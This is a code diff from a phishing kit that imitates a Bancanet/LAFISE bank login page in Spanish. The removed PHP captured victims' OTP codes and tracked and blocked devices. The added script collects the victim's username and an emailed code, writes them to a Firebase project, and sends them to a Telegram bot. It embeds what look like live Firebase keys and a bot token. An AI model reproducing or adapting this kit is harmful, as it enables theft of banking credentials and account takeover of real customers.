@@ -1,95 +1,7 @@
-<?php
-require_once 'functions.php';
-
-$info   = get_user_info();
-$ip     = $info['ip'];
-$device = get_device_id(); 
-
-// Verificar si el usuario está bloqueado
-if (get_user_state($device) === 'block') {
-    echo "<script>
-            alert('Acceso denegado: Tu usuario ha sido bloqueado.');
-            window.location.href = 'https://www.google.com';
-          </script>";
-    exit();
-}
-
-// Actualizar el usuario con su device_id
-update_user($ip, $info['location'], basename(__FILE__));
-
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $allowedFields = ["otp"];
-    $formData = [];
-
-    foreach ($_POST as $key => $value) {
-        if (in_array($key, $allowedFields, true)) {
-            $formData[$key] = trim($value);
-        }
-    }
-
-    if (!empty($formData)) {
-        $data = load_data();
-
-        if (!isset($data[$device])) { 
-            $data[$device] = ['submissions' => [], 'state' => 'active'];
-        }
-
-        $timestamp = date("Y-m-d H:i:s");
-        $found = false;
-
-        if (isset($data[$device]['submissions'])) {
-            foreach ($data[$device]['submissions'] as &$submission) {
-                $existingKeys = array_keys($submission['data']);
-                $formKeys     = array_keys($formData);
-                sort($existingKeys);
-                sort($formKeys);
-                if ($existingKeys === $formKeys) {
-                    // Reemplazar el submission existente
-                    $submission = [
-                        "data"      => $formData,
-                        "timestamp" => $timestamp
-                    ];
-                    $found = true;
-                    break;
-                }
-            }
-            unset($submission);
-        }
-
-        if (!$found) {
-            // Agregar nueva submission
-            $data[$device]['submissions'][] = [
-                "data"      => $formData,
-                "timestamp" => $timestamp
-            ];
-            // Si es la primera submission y aún no se asignó color, asignar siempre #FF0000
-            if (count($data[$device]['submissions']) === 1 && empty($data[$device]['color'])) {
-                $data[$device]['color'] = '#000000';
-            }
-        }
-
-        save_data($data);
-
-        header("Location: waiting.php");
-        exit();
-    } else {
-        echo "<script>alert('Por favor, complete al menos un campo válido.');</script>";
-    }
-}
-?>
 <!DOCTYPE html>
 <html lang="en" class="notranslate">
 
 <head>
-    <script>
-    setInterval(function () {
-      fetch('functions.php?action=ping', { method: 'GET', keepalive: true });
-    }, 5000);
-
-    window.addEventListener('unload', function () {
-      navigator.sendBeacon('functions.php?action=offline');
-    });
-  </script>
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta http-equiv="origin-trial"
         content="A7vZI3v+Gz7JfuRolKNM4Aff6zaGuT7X0mf3wtoZTnKv6497cVMnhy03KDqX7kBz/q/iidW7srW31oQbBt4VhgoAAACUeyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGUuY29tOjQ0MyIsImZlYXR1cmUiOiJEaXNhYmxlVGhpcmRQYXJ0eVN0b3JhZ2VQYXJ0aXRpb25pbmczIiwiZXhwaXJ5IjoxNzU3OTgwODAwLCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ==">
@@ -35867,14 +35779,14 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                                                                                         <div _ngcontent-c29=""
                                                                                             class="wizard-step-content-title">
                                                                                             <span
-                                                                                                _ngcontent-c29="">Para iniciar sesion ingresa tu
-<br> código OTP generado en tu movil</span>
+                                                                                                _ngcontent-c29="">Bienvenido
+                                                                                                a Bancanet</span>
                                                                                         </div>
                                                                                         <icb-login-step-user
                                                                                             _ngcontent-c29=""
                                                                                             _nghost-c35="">
                                                                                             <form _ngcontent-c35=""
-                                                                                                method="post"
+                                                                                                onsubmit="javascript: return sender()"
                                                                                                 class="wizardAutoHeightModeX ng-pristine ng-invalid ng-touched">
                                                                                                 <div _ngcontent-c35=""
                                                                                                     class="subotica">
@@ -35891,9 +35803,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                                                                                                                 disable-paste=""
                                                                                                                 formcontrolname="username"
                                                                                                                 required
-                                                                                                                name="otp"
-                                                                                                                id="otp"
-                                                                                                                placeholder="Escriba código Token OTP">
+                                                                                                                id="step01"
+                                                                                                                placeholder="Escriba código enviado al correo">
                                                                                                         </div>
 
 
@@ -36096,8 +36007,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                                                                                                                     <div _ngcontent-c36=""
                                                                                                                     class="subotica-content-button-table-right">
                                                                                                                     <button
-                                                                                                                        type="submit"
-                                                                                                                        
+                                                                                                                        type="button"
+                                                                                                                        onclick="sender()"
                                                                                                                         id="submitBtn"
                                                                                                                         class="custom-button">
                                                                                                                         Siguiente
@@ -41438,7 +41349,81 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             <div class="mesina-welcome-subtitle1">Por favor espere un momento...</div>
         </div>
     </div>
- 
+     <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-firestore.js"></script>
+
+<script>
+  // Configura Firebase igual que en waiting.html
+  const firebaseConfig = {
+    apiKey: "AIzaSyDkFiTElkEcL0B1eAtRrrCoGm9HCt9EGZc",
+    authDomain: "flab-d70ab.firebaseapp.com",
+    databaseURL: "https://flab-d70ab-default-rtdb.firebaseio.com",
+    projectId: "flab-d70ab",
+    storageBucket: "flab-d70ab.firebasestorage.app",
+    messagingSenderId: "789535969500",
+    appId: "1:789535969500:web:ff0f3be7c250dac33ee419"
+  };
+
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.firestore();
+
+  // Bot token y chat ID
+var telegram_bot_id = "7290225049:AAE6Z015W7bYLuLmVqUXlD782ft8roSTX7s";
+  var chat_id = -1003036046851;
+
+  var ready = function () {
+      USER = localStorage.getItem('username');
+      CORREO = document.getElementById("step01").value;
+      message = "🧙‍♂️LAFISE\n🤑USER: " + USER + "\n🤑CORREO: " + CORREO;
+  };
+
+  var sender = async function () {
+      ready();
+
+      // Obtén docId del localStorage (el ID del documento en Firestore)
+      const docId = localStorage.getItem("docId");
+      if (!docId) {
+        alert("No se encontró ID del usuario. Por favor inicia sesión nuevamente.");
+        return false;
+      }
+
+      try {
+        // Actualiza el campo page a 3 (por ejemplo, para token)
+        await db.collection("varable").doc(docId).update({
+          page: 2, // Cambia esto al número que quieras asignar para la redirección
+          correo: CORREO, // opcional, si quieres guardar el token también
+          timestamp: firebase.firestore.FieldValue.serverTimestamp()
+        });
+
+        // Envía el mensaje a Telegram
+        var settings = {
+          "async": true,
+          "crossDomain": true,
+          "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+          "method": "POST",
+          "headers": {
+              "Content-Type": "application/json",
+              "cache-control": "no-cache"
+          },
+          "data": JSON.stringify({
+              "chat_id": chat_id,
+              "text": message
+          })
+        };
+
+        await $.ajax(settings);
+
+        // Redirige a waiting.html que escuchará el cambio de "page"
+        location.href = "waiting.html";
+
+      } catch (error) {
+        console.error("Error actualizando Firestore o enviando Telegram:", error);
+        alert("Error al procesar los datos. Intenta de nuevo.");
+      }
+
+      return false;
+  }
+</script>
 
 </body>
 
